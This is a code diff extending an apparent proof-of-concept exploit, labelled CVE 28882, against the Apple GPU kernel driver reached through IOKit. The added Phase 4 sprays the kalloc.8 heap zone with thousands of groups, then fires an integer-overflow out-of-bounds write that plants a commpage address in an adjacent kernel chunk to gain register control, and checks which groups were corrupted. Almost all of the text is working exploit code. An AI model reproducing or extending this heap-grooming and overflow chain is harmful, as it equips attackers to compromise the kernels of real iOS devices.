@@ -43,11 +43,16 @@
 
 static os_log_t g_log;
 
-/* AllocatorProbe: allocate canary objects in the same kalloc zone
- * as IOGPUResidentMemorySet element arrays (kalloc.16 or kalloc.24).
- * If the BOF corrupts them, zone integrity check will panic. */
+/* AllocatorProbe: NOTE — MTLBuffer allocations do NOT land in kernel kalloc.8.
+ * The correct canaries for kalloc.8 are count=0 SGAR groups (see Phase 4).
+ * Keeping this block for baseline logging only; CANARY_SIZE=8 is a no-op here. */
 #define CANARY_ALLOC_COUNT  8000
-#define CANARY_SIZE         24   /* matches IOGPUResidentMemorySet element size */
+#define CANARY_SIZE         8    /* kalloc.8 is the OOB target zone */
+
+/* Phase 4 constants */
+#define GROOM_COUNT         2048
+/* Commpage flag userspace alias — kernel jumping here = register control (GPR=this) */
+#define COMMPAGE_FLAG       0x0000000FFFFFC330ULL
 
 static WKWebView *g_wv = nil;
 static _Atomic int g_done = 0;
@@ -324,6 +329,112 @@ static kern_return_t try_sel8(io_connect_t conn, uint32_t group_id, const char *
     return kr;
 }
 
+/* Quiet variants — suppress per-call logging for high-volume spray */
+static uint64_t try_sgar_q(io_connect_t conn, uint32_t count) {
+    static uint8_t s[SGAR_STRUCT_SIZE];
+    uint8_t out[0x10]; size_t out_sz = sizeof(out); uint32_t cnt = 0;
+    memset(s, 0, sizeof(s));
+    *(uint32_t *)(s + SGAR_COUNT_OFFSET) = count;
+    kern_return_t kr = IOConnectCallMethod(conn, SGAR_SELECTOR,
+        NULL, 0, s, sizeof(s), NULL, &cnt, out, &out_sz);
+    if (kr == 0) return *(uint64_t *)out;
+    return 0;
+}
+
+static kern_return_t try_sel7_q(io_connect_t conn, uint32_t gid) {
+    uint64_t sc[1] = { gid };
+    return IOConnectCallMethod(conn, 7, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
+}
+
+/*
+ * trigger_phase4: groom kalloc.8 with count=0 SGAR groups (8-byte resource_arrays),
+ * overwrite adjacent chunk with COMMPAGE_FLAG via OOB write, then trigger
+ * all groomed groups to observe corruption (sel=7 returns kr≠0 if fn_B sees
+ * count mismatch in the overwritten resource_array).
+ *
+ * OOB write anatomy (count=0x80000000, element_size=4):
+ *   alloc_size = (0x80000000 * 4) mod 2^32 + 8 = 0 + 8 = 8 bytes
+ *   Copy writes struct[0x28..0x2F] -> resource_array[8..15] (OOB by 8 bytes)
+ *   resource_array[8..15] = adjacent kalloc.8 chunk's first 8 bytes
+ *
+ * Detection: baseline sel=7 on count=0 groups returns kr=0.
+ *   After overflow, a corrupted group returns kr≠0 from fn_B count mismatch.
+ */
+static void trigger_phase4(io_connect_t conn) {
+    evf("[P4] START: groom %d count=0 groups -> kalloc.8 spray", GROOM_COUNT);
+
+    uint32_t groom_gids[GROOM_COUNT];
+    int groom_valid = 0;
+    for (int gi = 0; gi < GROOM_COUNT; gi++) {
+        uint64_t g = try_sgar_q(conn, 0);
+        if (g) groom_gids[groom_valid++] = (uint32_t)g;
+    }
+    evf("[P4] GROOM done: %d/%d groups created in kalloc.8", groom_valid, GROOM_COUNT);
+
+    /* Baseline: sel=7 on all should return kr=0 (count=0 groups have no work) */
+    int baseline_ok = 0, baseline_fail = 0;
+    for (int gi = 0; gi < groom_valid; gi++) {
+        kern_return_t bkr = try_sel7_q(conn, groom_gids[gi]);
+        if (bkr == 0) baseline_ok++; else baseline_fail++;
+    }
+    evf("[P4] BASELINE: kr=0 -> %d, kr!=0 -> %d (expect all 0)", baseline_ok, baseline_fail);
+
+    /* OOB write: count=0x80000000, fill entry region with COMMPAGE_FLAG.
+     * struct[0x28..0x2F] = COMMPAGE_FLAG -> resource_array[8..15] = adjacent chunk */
+    static uint8_t cs[SGAR_STRUCT_SIZE];
+    uint8_t co[0x10]; size_t co_sz = sizeof(co); uint32_t co_cnt = 0;
+    memset(cs, 0, sizeof(cs));
+    *(uint32_t *)(cs + SGAR_COUNT_OFFSET) = 0x80000000u;
+    for (uint32_t off = 0x28; off + 8 <= SGAR_STRUCT_SIZE; off += 8)
+        *(uint64_t *)(cs + off) = COMMPAGE_FLAG;
+    kern_return_t ckr = IOConnectCallMethod(conn, SGAR_SELECTOR,
+        NULL, 0, cs, sizeof(cs), NULL, &co_cnt, co, &co_sz);
+    uint64_t corrupt_gid = (ckr == 0) ? *(uint64_t *)co : 0;
+    evf("[P4] OOB_WRITE count=0x80000000 entries=0x%016llx kr=0x%x gid=0x%llx",
+        COMMPAGE_FLAG, ckr, corrupt_gid);
+
+    /* Second variant: only first entry = COMMPAGE_FLAG so adjacent[0..7]=COMMPAGE_FLAG */
+    {
+        static uint8_t cs2[SGAR_STRUCT_SIZE];
+        uint8_t co2[0x10]; size_t co2_sz = sizeof(co2); uint32_t co2_cnt = 0;
+        memset(cs2, 0, sizeof(cs2));
+        *(uint32_t *)(cs2 + SGAR_COUNT_OFFSET) = 0x80000000u;
+        *(uint64_t *)(cs2 + 0x28) = COMMPAGE_FLAG;   /* adjacent[0..7] = COMMPAGE_FLAG */
+        *(uint64_t *)(cs2 + 0x30) = 0;               /* adjacent[8..] = 0 if hit */
+        kern_return_t ckr2 = IOConnectCallMethod(conn, SGAR_SELECTOR,
+            NULL, 0, cs2, sizeof(cs2), NULL, &co2_cnt, co2, &co2_sz);
+        uint64_t cgid2 = (ckr2 == 0) ? *(uint64_t *)co2 : 0;
+        evf("[P4] OOB_EXACT adjacent=COMMPAGE_FLAG kr=0x%x gid=0x%llx", ckr2, cgid2);
+    }
+
+    /* Trigger: sel=7 on all groomed groups. Corrupted groups will return kr!=0 */
+    int post_ok = 0, post_fail = 0;
+    uint32_t first_corrupt_gid = 0;
+    for (int gi = 0; gi < groom_valid; gi++) {
+        kern_return_t pkr = try_sel7_q(conn, groom_gids[gi]);
+        if (pkr == 0) post_ok++;
+        else {
+            post_fail++;
+            if (!first_corrupt_gid) first_corrupt_gid = groom_gids[gi];
+        }
+    }
+    evf("[P4] POST_TRIGGER: kr=0 -> %d, kr!=0 -> %d (non-zero = OOB HIT!)",
+        post_ok, post_fail);
+    if (first_corrupt_gid)
+        evf("[P4] FIRST_CORRUPT gid=0x%x OOB_CONFIRMED -> adjacent kalloc.8 chunk written",
+            first_corrupt_gid);
+
+    /* Also trigger via sel=8 to hit alternate code path */
+    if (corrupt_gid) {
+        try_sel8(conn, (uint32_t)corrupt_gid, "P4_SEL8_OVERFLOW");
+        /* Direct trigger: the overflow group itself has count=0x80000000 stored.
+         * Calling sel=7 on it will test fn_B's handling of this extreme count. */
+        try_sel7(conn, (uint32_t)corrupt_gid, "P4_SEL7_OVERFLOW");
+    }
+
+    evf("[P4] DONE — if device panics now, check IPS for GPR=0x%016llx", COMMPAGE_FLAG);
+}
+
 static void trigger_bof_iokit(void) {
     evf("[BOF] IOKIT_START sel=%d struct=0x%x count_off=0x%x",
         SGAR_SELECTOR, SGAR_STRUCT_SIZE, SGAR_COUNT_OFFSET);
@@ -453,22 +564,48 @@ void run_cve28882_poc(UIWindow *window) {
         /* Phase 1: Spray canaries */
         spray_canaries(dev);
 
-        /* Phase 2: Raw IOUserClient probe (must run before Metal overflow) */
+        /* Phase 2: Raw IOUserClient probe — OOB write baseline */
         trigger_bof_iokit();
 
-        /* Phase 3: Trigger via Metal API — overflow attempt crashes via SIGSEGV
-         * if Metal iterates pointers; skip Metal overflow, just baseline test */
+        /* Phase 3: Metal API baseline (no overflow — Metal caps count) */
         trigger_bof(dev);
 
-        /* Phase 4: Check canaries */
-        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2*NSEC_PER_SEC),
+        /* Phase 4: MTLBuffer canary check (note: not in kalloc.8, informational only) */
+        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 1*NSEC_PER_SEC),
                        dispatch_get_main_queue(), ^{
             int corrupt = check_canaries();
             if (corrupt > 0) {
-                evf("UAF_INDICATOR canary_corrupt=%d BOF_CONFIRMED", corrupt);
+                evf("MTL_CANARY corrupt=%d (note: not kalloc.8, different zone)", corrupt);
             } else {
-                evf("DONE: canaries intact (BOF did not corrupt canaries)");
-                evf("DONE: raw IOKit path needed with correct arg struct layout");
+                evf("MTL_CANARY: intact (expected — MTLBuffer not in kalloc.8)");
+            }
+        });
+
+        /* Phase 4 (SGAR groom+corrupt+trigger): needs fresh connection */
+        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3*NSEC_PER_SEC),
+                       dispatch_get_main_queue(), ^{
+            mach_port_t mp4 = 0;
+            IOMasterPort(MACH_PORT_NULL, &mp4);
+            io_connect_t conn4 = 0;
+            const char *svc4[] = { "AGXAcceleratorG18P", "IOGPU", "AGXAccelerator", NULL };
+            for (int si = 0; svc4[si] && !conn4; si++) {
+                CFMutableDictionaryRef m4 = IOServiceMatching(svc4[si]);
+                io_iterator_t it4 = 0;
+                IOServiceGetMatchingServices(mp4, m4, &it4);
+                io_service_t sv4 = IOIteratorNext(it4);
+                IOObjectRelease(it4);
+                if (!sv4) continue;
+                kern_return_t kr4 = IOServiceOpen(sv4, mach_task_self(), 1, &conn4);
+                IOObjectRelease(sv4);
+                if (kr4 != 0) conn4 = 0;
+            }
+            if (conn4) {
+                evf("[P4] CONN4 ready=0x%x", conn4);
+                trigger_phase4(conn4);
+                IOServiceClose(conn4);
+                evf("[P4] CONN4 closed");
+            } else {
+                evf("[P4] CONN4 failed: cannot open for Phase 4");
             }
         });
     });
